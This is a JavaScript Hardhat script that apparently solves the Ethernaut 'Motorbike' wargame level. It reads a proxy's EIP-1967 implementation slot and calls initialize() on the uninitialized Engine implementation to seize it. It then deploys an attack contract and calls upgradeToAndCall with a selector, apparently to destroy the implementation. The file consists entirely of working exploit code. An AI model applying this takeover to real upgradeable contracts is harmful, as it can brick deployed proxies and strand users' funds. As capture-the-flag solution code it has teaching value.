const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x463dFF5FF40c5BbE33CC02F6Eb8fE640E93B7120";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Engine = await ethers.getContractFactory("Engine");

  // Attack

  const implementationSlotContents = await ethers.provider.getStorageAt(
    instanceAddress,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
  );
  const implementationAddress = "0x" + implementationSlotContents.slice(26);

  const engine = Engine.attach(implementationAddress);

  let tx = await engine.initialize();
  await tx.wait();

  const AttackContract = await ethers.getContractFactory("MotorbikeAttack");
  const attackerContract = await AttackContract.deploy();
  await attackerContract.deployed();

  tx = await engine.upgradeToAndCall(attackerContract.address, "0x7a4c33a6", {
    gasLimit: 200000,
  });
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
